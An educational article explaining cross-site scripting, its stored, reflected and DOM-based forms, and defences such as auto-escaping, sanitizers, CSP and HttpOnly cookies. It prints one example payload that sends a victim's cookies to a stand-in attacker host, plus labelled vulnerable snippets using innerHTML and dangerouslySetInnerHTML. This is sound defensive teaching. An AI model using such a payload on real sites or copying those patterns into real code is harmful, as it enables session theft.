---
title: Cross-Site Scripting (XSS)
summary: Attacker-controlled text becomes JavaScript running in another user's browser unless it is encoded for the place it lands, so let the framework encode and treat everything else as a backstop.
date: 2026-09-14
---

Picture a blog with a comment box. A visitor types a comment, your server stores it, and every later reader sees it under the post. What happens if the comment is not text, but code?

That is cross-site scripting (XSS): an attacker gets their own JavaScript to run in another user's browser, with the privileges of your site. It is [SQL injection](/security/sql-injection)'s sibling on the front end. SQL injection smuggles code into a query; XSS smuggles it into a page. In both, untrusted input is mixed into something a parser will interpret, and the parser cannot tell the data from the instructions.

Here is the blog's rendering code, with the mistake in it:

```js
// vulnerable: the comment is parsed as HTML, not shown as text
container.innerHTML = `<p>${comment}</p>`;
```

Suppose the comment is `<img src=x onerror="fetch('https://evil.example/?c='+document.cookie)">`. The browser parses it as an image tag, the image fails to load (there is no image at `x`), and the `onerror` handler runs. That code now executes for everyone who opens the post.

## What can the attacker do from there?

The injected script runs in the reader's **origin**, meaning the combination of scheme, host and port that the browser uses to decide what a script may touch. So it can do anything your own page's script can do. It can read anything JavaScript can read (cookies without the `HttpOnly` flag, which hides a cookie from scripts, tokens kept in `localStorage`), send requests to your server as the logged-in reader, record keystrokes, and rewrite the page to show a fake login form. The reader never did anything wrong except open a post.

## How does the payload reach the page?

There are three routes, and the blog can suffer all of them:

- **Stored.** The payload is saved, as in the comment above, and served to every viewer. One submission reaches everyone, which makes it the most damaging kind.
- **Reflected.** The payload travels in the request and is echoed straight into the response. If the blog's search page prints "No results for ..." using the `?q=` parameter, an attacker can email a victim a link with the payload in `q`. The victim's browser requests it, the server writes the parameter into the page, and the browser runs it.
- **DOM-based.** The server is innocent. Client-side script reads attacker-controlled input, such as `location.hash` or a `postMessage` payload, and writes it into the page itself.

## What is the fix?

Encode data for the place it is going. A comment inside an HTML body needs `<` turned into `&lt;`, so the browser shows a bracket instead of opening a tag. A value inside an HTML attribute, a JavaScript string or a URL each needs different escaping, which is why hand-rolled filters fail. So don't encode by hand: use a templating layer that escapes automatically and let it build the page.

```jsx
// safe: React escapes the string, so "<img ...>" shows up as visible text
<p>{comment}</p>

// vulnerable: this opts out of the escaping
<div dangerouslySetInnerHTML={{ __html: comment }} />
```

React escapes anything you interpolate into markup. You get XSS back only by reaching for an escape hatch: `dangerouslySetInnerHTML`, `innerHTML`, `eval`, `document.write`, or a URL you did not check (a link whose `href` begins with `javascript:` runs code when clicked). Search your codebase for those names and you have found the places worth reviewing.

What if the blog wants comments with bold and italics, so it must allow some HTML? Then you cannot escape everything. Run the comment through a maintained **sanitizer** (a library that parses the HTML and keeps only an allowlist of safe tags and attributes), and do not write that filter yourself.

Why not simply strip out `<script>`? Because the attack above never used it. Event handlers like `onerror`, `javascript:` URLs and odd encodings all run code, and attackers keep finding new ones. A blocklist chases the attacker; encoding at the boundary removes the problem.

## What if one slips through anyway?

Add layers, because one missed escape is enough. A **Content-Security-Policy** (CSP) is a response header telling the browser which script sources it may run. A policy that bans inline scripts and unknown origins would have stopped the `onerror` payload. Setting session cookies `HttpOnly` hides them from JavaScript, so a successful XSS cannot steal the cookie. It can still send requests as the user while the page is open, which is why `HttpOnly` limits the damage and does not prevent the attack. The same reasoning is behind the advice in [JSON Web Tokens](/security/jwt) to avoid keeping long-lived tokens in storage that scripts can read.

**Rule of thumb.** Treat every string that did not come from your own code as hostile, including display names, error messages and URL parameters. Let an auto-escaping framework encode it for where it lands, sanitize with a library when you must allow HTML, and keep a CSP and `HttpOnly` cookies as the backstop.
